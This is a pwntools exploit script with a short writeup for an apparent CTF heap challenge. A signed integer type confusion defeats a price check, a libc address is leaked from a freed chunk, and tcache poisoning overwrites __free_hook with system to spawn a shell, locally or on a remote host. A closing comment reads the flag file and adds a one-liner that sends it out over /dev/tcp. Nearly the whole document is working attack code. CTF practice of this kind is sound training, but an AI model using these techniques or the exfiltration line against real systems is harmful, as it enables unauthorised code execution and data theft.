from pwn import *
import sys
import time

context.log_level = "debug"


# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i)
        for i in __import__("subprocess")
        .check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


# brva x = b *(pie+x)
# set follow-fork-mode
if len(sys.argv) == 1:
    r = process("./BH3_patched")
    if args.GDB:
        # gdb.attach(r, 'brva 0x1517\nbrva 0x1418\nbrva 0x1446\nbrva 0x1470')
        gdb.attach(r, "brva 0x1517")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

"""
Breakpoints:
First after input_num see rax
"""

"""
malloc 0, malloc 1, free 0, free 1, malloc 0, show 0
"""


def malloc(idx, len):  # index 0 to 10
    r.sendlineafter(b"Choice : \n", b"1")
    r.sendlineafter(b"index : ", str(idx))
    r.sendlineafter(b"Quantity : ", str(len))


def free(idx):
    r.sendlineafter(b"Choice : \n", b"2")
    r.sendlineafter(b"index : ", str(idx))


def show(idx):
    r.sendlineafter(b"Choice : \n", b"3")
    r.sendlineafter(b"index : ", str(idx))


def comment(idx, content):  # index <= 10?
    r.sendlineafter(b"Choice : \n", b"4")
    r.sendlineafter(b"index : ", str(idx))
    r.sendlineafter(b"Concent : ", content)


def overflow32bytes(idx, content):  # index <= 9
    r.sendlineafter(b"Choice : \n", b"6")
    r.sendlineafter(b"index : ", str(idx))
    r.sendlineafter(b"Leave info : ", content)


malloc(8, 1145141145141919810)  # 惡 臭 警 告 ( 嘔
malloc(0, 0x420)  # Chunk 0
malloc(1, 1)  # Chunk 1, Prevent consolidate
malloc(2, 1)
malloc(3, 1)
free(0)
malloc(0, 0x420)
show(0)
libc_leak = u64(r.recv(6).ljust(8, b"\x00"))
print(f"libc_leak: {hex(libc_leak)}")
libc = libc_leak - 0x1ECBE0
print(f"libc: {hex(libc)}")
system = libc + 0x52290
free_hook = libc + 0x1EEE48
print(f"system: {hex(system)}")
print(f"free_hook: {hex(free_hook)}")
free(1)
free(3)
overflow32bytes(2, b"A" * 16 + p64(0) + p64(0x21) + p64(free_hook))  # Overwrite fd
malloc(1, 1)
malloc(3, 1)
comment(1, b"/bin/sh\x00")
comment(3, p64(system))  # Should be overwriting free_hook
free(1)  # Trigger free_hook
r.interactive()

"""
Writeup:
Sice there's a total limit of bin size. Starting at 12800 and each vaccine is quantity <<7 dollars. It'll malloc(8 * quantity)
Can we fake it?
Yes! In purchase function we have type confusion. All of them are signed.
We need to find a number s.t. quantity << 7 <= 12800 && 8 * quantity is a malloc-able size.
quantity << 7 we need < 0 since it'll "minus" a negative number.
Maybe we can just fuzz it XD
In my opinion, I think you should read assembly code to understand it better. Or use gdb to see value XD
Set break point near those value, we need total price is a pretty big negative number so that we minus a negative number and we'll have a lot of money.
And we need a reasonable malloc size since malloc doesn't accept extreme large number anymore since 2.29 due to fixing house of force.
Tcache 2.31
if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
We need to bypass count check by putting another bin in tcache. The rest is just typical heap exploitation stuff.
"""


"""
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
"""
